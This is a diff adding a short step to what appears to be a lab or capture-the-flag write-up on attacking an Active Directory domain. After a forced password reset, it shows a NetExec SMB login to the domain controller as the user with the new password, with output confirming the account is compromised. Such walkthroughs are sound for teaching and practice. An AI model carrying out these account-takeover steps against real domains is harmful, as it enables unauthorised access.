@@ -1261,3 +1261,10 @@ CHANGE-P... 10.0.18.23      445    DC               [+] Successfully changed pas
 ```
 Now the users password has been changed!
 
+```python
+nxc smb dc.novacart.local -u m.mignola -p 'Password123!'                                                          
+SMB         10.0.18.23      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:novacart.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.18.23      445    DC               [+] novacart.local\m.mignola:Password123!
+```
+The user is now compromised!
+
